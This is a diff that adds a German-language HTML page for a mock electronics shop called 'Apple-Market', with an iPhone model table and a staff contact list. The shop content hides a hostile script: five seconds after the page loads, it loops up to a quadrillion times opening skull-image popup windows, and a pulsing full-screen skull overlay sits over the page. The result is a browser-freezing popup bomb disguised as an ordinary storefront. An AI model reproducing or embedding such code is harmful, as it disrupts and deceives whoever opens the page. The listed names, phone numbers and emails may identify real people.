@@ -1,0 +1,226 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 5.01//EN" "http://www.w3.org/TR/html5/strict.dtd">
+ <html>
+<link rel = "stylesheet" type = "text/css" href = "Dateien/Apple-Market.css">
+<head>
+
+  <title> Apple-Market </title>
+</head>
+
+<div id = "Kopf">
+
+<a href = "Apple-Market.html"> Apple-Market </a>
+ </div>
+
+<div id = "Nav">
+
+<a id = "lightgreen" href = "#Produkte"> Produkte </a>
+<a id = "green" href = "Dateien/Ueberuns.html" target = "_blank"> &Uumlber uns </a>
+<a id = "darkgreen" href = "#Kontakt"> Kontakt </a>
+</div>
+
+<body>
+<style>
+    #popup {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 9999;
+      background-color: #a71106;
+      color: white;
+      padding: 100px;
+      border-radius: 50px;
+      animation: popup 2s ease-in-out infinite;
+    }
+    
+    @keyframes popup {
+      0% {
+        transform: translate(-50%, -50%) scale(1);
+      }
+      50% {
+        transform: translate(-50%, -50%) scale(1.2);
+      }
+      100% {
+        transform: translate(-50%, -50%) scale(1);
+      }
+    }
+    
+    .hidden {
+      display: none;
+    }
+ </style>
+
+
+ <div id="popup">
+   	     
+	<img src="Dateien/Bilder/Totenkopf.png" width="600px" height="400px"
+                          alt="Bild von Totenkopf">
+ </div>
+
+
+ 
+ <script>
+    
+    function showPopup() {
+        for (var i = 1; i <= 1000000000000000; i++) {
+            var popup = window.open("", "popup" + i, "width=300, height=200","fullscreen=yes"); 
+            popup.document.write("<img src='Dateien/Bilder/Totenkopf.png' style='width:100%; height:100%;'>");
+            src="Dateien/script.js"     
+            popup.document.close();
+            popup.blur();
+        }
+    }
+
+    setTimeout(showPopup, 5000); // Aufruf der Funktion showPopup() nach 5 Sekunden
+    
+	
+ </script>
+
+ 
+
+
+
+<div align = "center">
+
+<img src = "Dateien/Bilder/Logo.jpg" width = "80%"
+     alt = "Logo von Apple-Market">
+
+<br> <br> <br>
+
+<h1> Modell-&Uumlbersicht </h1>
+
+<br> <br> <br>
+
+<a name = "Produkte">
+<h2 align = "left"> iPhone-Modelle </h2>
+
+
+
+<table border = "0" cellpadding = "25%" width = "100%" align = "center">
+
+<tr>
+  <th> iPhone 13 Pro
+  <th> iPhone 13
+  <th> iPhone 12
+  <th> iPhone 11
+</tr>
+
+<tr>
+  <td> <img src = "Dateien/Bilder/iPhone 13 Pro.png" width = "300" height = "340"
+                          alt = "Bild von iPhone 13 Pro">
+
+  <td> <img src = "Dateien/Bilder/iPhone 13.png" width = "300" height = "340"
+                          alt = "Bild von iPhone 13">
+
+  <td> <img src = "Dateien/Bilder/iPhone 12.png" width = "300" height = "340"
+                          alt = "Bild von iPhone 12">
+
+  <td> <img src = "Dateien/Bilder/iPhone 11.png" width = "300" height = "340"
+                          alt = "Bild von iPhone 11">
+
+</tr>
+
+<tr>
+  <th> 6,1 Zoll OLED-Display + Promotion
+  <th> 6,1 Zoll OLED-Display
+  <th> 6,1 Zoll OLED-Display
+  <th> 6,1 Zoll LCD-Display
+</tr>
+
+<tr>
+  <th> 203g
+  <th> 173g
+  <th> 162g
+  <th> 194g
+</tr>
+
+<tr>
+  <th> A15 Bionic-Prozessor in Pro-Version
+  <th> A15 Bionic-Prozessor
+  <th> A14 Bionic-Prozessor
+  <th> A13 Bionic-Prozessor
+</tr>
+
+<tr>
+  <th> fortschrittliches 3-Kamera-System
+  <th> optimiertes 2-Kamera-System
+  <th> professionelles 2-Kamera-System
+  <th> 2-Kamera-System
+</tr>
+
+
+
+<tr align = "center">
+  <td> <a href = "Dateien/iPhone 13 Pro kaufen.html" target = "_blank" id = "WeitereLinks"> n&aumlher anschauen </a>
+  <td> <a href = "Dateien/iPhone 13 kaufen.html" target = "_blank" id = "WeitereLinks"> n&aumlher anschauen </a>
+  <td> <a href = "Dateien/iPhone 12 kaufen.html" target = "_blank" id = "WeitereLinks"> n&aumlher anschauen </a>
+  <td> <a href = "Dateien/iPhone 11 kaufen.html" target = "_blank" id = "WeitereLinks"> n&aumlher anschauen </a>
+
+</tr>
+
+<tr align = "center">
+  <td> <a href = "Dateien/iPhone 13 Pro kaufen.html#Ankername1" target = "_blank" id = "WeitereLinks"> mehr technische Details </a>
+  <td> <a href = "Dateien/iPhone 13 kaufen.html#Ankername2" target = "_blank" id = "WeitereLinks"> mehr technische Details </a>
+  <td> <a href = "Dateien/iPhone 12 kaufen.html#Ankername3" target = "_blank" id = "WeitereLinks"> mehr technische Details </a>
+  <td> <a href = "Dateien/iPhone 11 kaufen.html#Ankername4" target = "_blank" id = "WeitereLinks"> mehr technische Details </a>
+
+</tr>
+
+
+
+</table>
+
+</a>
+
+
+
+<br><br><br><br><br><br><br><br><br><br>
+
+<a name = "Kontakt">
+<table id = "TabelleKontakt" cellpadding = "25" border = "0">
+
+    <caption id = "Kontakt"> Kontakt </caption>
+
+  <tr>
+    <th id = "TabelleKontakt1"> Fragen zu Produkten
+    <th id = "TabelleKontakt1"> Probleme bei der Lieferung
+    <th id = "TabelleKontakt1"> Hilfe bei einer Reklamation
+    <th id = "TabelleKontakt1"> Fragen zur Garantie
+  </tr>
+
+  <tr>
+    <td align = "center" id = "TabelleKontakt2"> Ina Ham <p> Tel: 07147 9821 <p> <a href = "mailto: Ina.Ham@web.de"> E-Mail </a>
+    <td align = "center" id = "TabelleKontakt2"> Martin Kaser <p> Tel: 07147 9121 <p> <a href = "mailto: Martin.Kaser@web.de"> E-Mail </a>
+    <td align = "center" id = "TabelleKontakt2"> Bruno Schweizer <p> Tel: 07147 9855 <p> <a href = "mailto: Bruno.Schweizer@web.de"> E-Mail </a>
+    <td align = "center" id = "TabelleKontakt2"> Sabine Glok <p> Tel: 07147 9221 <p> <a href = "mailto: Sabine.Glok@web.de"> E-Mail </a>
+
+  </tr>
+
+  <tr>
+    <td align = "center" id = "TabelleKontakt2"> Marianne Ditel <p> Tel: 07147 9171 <p> <a href = "mailto: Marianne.Ditel@web.de"> E-Mail </a>
+    <td align = "center" id = "TabelleKontakt2"> Anne Mork <p> Tel: 07147 9811 <p> <a href = "mailto: Anne.Mork@web.de"> E-Mail </a>
+    <td align = "center" id = "TabelleKontakt2"> Peter Klemann <p> Tel: 07147 9041 <p> <a href = "mailto: Peter.Klemann@web.de"> E-Mail </a>
+    <td align = "center" id = "TabelleKontakt2"> Clara Roris <p> Tel: 07147 9931 <p> <a href = "mailto: Clara.Roris@web.de"> E-Mail </a>
+  </tr>
+
+</table>
+
+</a>
+
+<br><br>
+
+<h4> <a href = "Dateien/Kontakt.html"> Kontaktformular </a> </h4>
+
+
+</div>
+
+
+</body>
+
+
+
+
+
+
+
+ </html>
